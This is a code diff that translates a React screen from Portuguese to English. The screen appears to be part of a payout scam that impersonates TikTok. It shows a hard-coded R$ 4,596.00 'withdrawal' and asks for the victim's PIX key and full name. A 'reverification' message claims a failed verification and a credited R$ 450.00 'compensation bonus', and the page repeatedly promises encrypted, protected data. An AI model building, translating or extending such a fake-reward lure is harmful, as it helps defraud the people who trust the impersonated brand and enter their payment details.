@@ -14,8 +14,8 @@ const PIX_KEY_TYPES = [
   { id: "cpf", label: "CPF" },
   { id: "cnpj", label: "CNPJ" },
   { id: "email", label: "E-mail" },
-  { id: "phone", label: "Telefone" },
-  { id: "random", label: "Chave Aleatória" },
+  { id: "phone", label: "Phone" },
+  { id: "random", label: "Random key" },
 ];
 
 type Step = "form" | "confirm";
@@ -51,18 +51,18 @@ const BankDetailsScreen = ({ userName, onSubmit, isReverification = false }: Ban
         <TikTokHeader showHelp />
         <div className="flex-1 px-6 py-6">
           <div className="mt-4 mb-2 flex items-center justify-between">
-            <h2 className="text-xl font-semibold">Confirme seus dados</h2>
+            <h2 className="text-xl font-semibold">Confirm your details</h2>
             <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
               Passo 3 de 4
             </span>
           </div>
           <p className="text-sm text-muted-foreground mb-6">
-            Revise as informações do seu PIX antes de enviar.
+            Review your PIX information before submitting.
           </p>
 
           <div className="rounded-2xl border border-border bg-card p-5 space-y-4">
             <div>
-              <p className="text-xs text-muted-foreground">Método</p>
+              <p className="text-xs text-muted-foreground">Method</p>
               <p className="text-sm font-medium">PIX</p>
             </div>
             <div>
@@ -91,7 +91,7 @@ const BankDetailsScreen = ({ userName, onSubmit, isReverification = false }: Ban
           <div className="flex items-center gap-2 p-3 rounded-xl bg-success/5 border border-success/20 mt-5">
             <ShieldCheck className="w-4 h-4 text-success shrink-0" />
             <p className="text-xs text-muted-foreground">
-              Seus dados estão <strong className="text-foreground">criptografados</strong> e protegidos.
+              Your data is <strong className="text-foreground">encrypted</strong> and protected.
             </p>
           </div>
 
@@ -99,14 +99,14 @@ const BankDetailsScreen = ({ userName, onSubmit, isReverification = false }: Ban
             {submitting ? (
               <span className="flex items-center gap-2">
                 <span className="w-4 h-4 border-2 border-primary-foreground/40 border-t-primary-foreground rounded-full animate-spin" />
-                Processando...
+                Processing...
               </span>
             ) : (
-              "Confirmar e Continuar"
+              "Confirm and continue"
             )}
           </Button>
           <Button variant="ghost" onClick={() => setStep("form")} className="w-full mt-3 text-sm text-muted-foreground">
-            ← Voltar e editar
+            ← Go back and edit
           </Button>
         </div>
       </div>
@@ -119,16 +119,16 @@ const BankDetailsScreen = ({ userName, onSubmit, isReverification = false }: Ban
       <TikTokHeader showHelp />
       <div className="flex-1 px-6 py-6">
         <p className="text-sm text-muted-foreground mb-1">
-          Bem-vindo de volta, <strong className="text-foreground">{userName}!</strong>
+          Welcome back, <strong className="text-foreground">{userName}!</strong>
         </p>
         <div className="mt-4 mb-2 flex items-center justify-between">
-          <h2 className="text-xl font-semibold">Dados do PIX</h2>
+          <h2 className="text-xl font-semibold">PIX details</h2>
           <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
             Passo 3 de 4
           </span>
         </div>
         <p className="text-sm text-muted-foreground mb-4">
-          Informe sua chave PIX para receber o saque de <strong className="text-foreground">R$ 4.596,00</strong>.
+          Enter your PIX key to receive the <strong className="text-foreground">R$ 4,596.00</strong> withdrawal.
         </p>
 
         {isReverification && (
@@ -136,18 +136,18 @@ const BankDetailsScreen = ({ userName, onSubmit, isReverification = false }: Ban
             <div className="flex items-start gap-2.5 p-3.5 rounded-xl bg-destructive/5 border border-destructive/20">
               <AlertCircle className="w-4 h-4 text-destructive shrink-0 mt-0.5" />
               <div>
-                <p className="text-xs font-semibold text-destructive">Falha na verificação PIX</p>
+                <p className="text-xs font-semibold text-destructive">PIX verification failed</p>
                 <p className="text-xs text-muted-foreground mt-0.5">
-                  Sua chave PIX anterior não pôde ser verificada pelo nosso processador de pagamentos. Isso pode acontecer quando a chave está incorreta ou a conta possui restrições para receber transferências.
+                  Your previous PIX key could not be verified by our payment processor. This can happen when the key is incorrect or the account has restrictions on receiving transfers.
                 </p>
               </div>
             </div>
             <div className="flex items-start gap-2.5 p-3.5 rounded-xl bg-secondary border border-border">
               <ShieldCheck className="w-4 h-4 text-primary shrink-0 mt-0.5" />
               <div>
-                <p className="text-xs font-semibold">Por que preciso informar novamente?</p>
+                <p className="text-xs font-semibold">Why do I need to enter it again?</p>
                 <p className="text-xs text-muted-foreground mt-0.5">
-                  Para proteger seus fundos, nosso processador de pagamentos exige informações de saque precisas. Por favor, verifique sua chave PIX e o nome do recebedor antes de enviar. Seu bônus de compensação de R$ 450,00 já foi creditado ao seu saldo.
+                  To protect your funds, our payment processor requires accurate withdrawal information. Please check your PIX key and recipient name before submitting. Your R$ 450.00 compensation bonus has already been credited to your balance.
                 </p>
               </div>
             </div>
@@ -157,13 +157,13 @@ const BankDetailsScreen = ({ userName, onSubmit, isReverification = false }: Ban
         <div className="flex items-center gap-2 p-3 rounded-xl bg-success/5 border border-success/20 mb-5">
           <ShieldCheck className="w-4 h-4 text-success shrink-0" />
           <p className="text-xs text-muted-foreground">
-            Seus dados estão <strong className="text-foreground">criptografados</strong> e armazenados com segurança.
+            Your data is <strong className="text-foreground">encrypted</strong> and securely stored.
           </p>
         </div>
 
         <div className="space-y-4">
           <div>
-            <label className="text-sm font-medium mb-1.5 block">Tipo de chave PIX</label>
+            <label className="text-sm font-medium mb-1.5 block">PIX key type</label>
             <div className="grid grid-cols-3 gap-2">
               {PIX_KEY_TYPES.map((t) => (
                 <button
@@ -192,7 +192,7 @@ const BankDetailsScreen = ({ userName, onSubmit, isReverification = false }: Ban
                   keyType === "cnpj" ? "00.000.000/0000-00" :
                   keyType === "email" ? "seu@email.com" :
                   keyType === "phone" ? "+55 (00) 00000-0000" :
-                  "Chave aleatória"
+                  "Random key"
                 }
                 value={pixKey}
                 onChange={(e) => setPixKey(e.target.value)}
@@ -205,7 +205,7 @@ const BankDetailsScreen = ({ userName, onSubmit, isReverification = false }: Ban
             <label className="text-sm font-medium mb-1.5 block">Nome do recebedor</label>
             <Input
               type="text"
-              placeholder="Nome completo do titular"
+              placeholder="Account holder's full name"
               value={recipientName}
               onChange={(e) => setRecipientName(e.target.value)}
               className="h-12 rounded-xl"
@@ -218,7 +218,7 @@ const BankDetailsScreen = ({ userName, onSubmit, isReverification = false }: Ban
           disabled={!isFormValid()}
           className="w-full h-14 rounded-full text-base font-semibold mt-8"
         >
-          Continuar
+          Continue
         </Button>
       </div>
     </div>
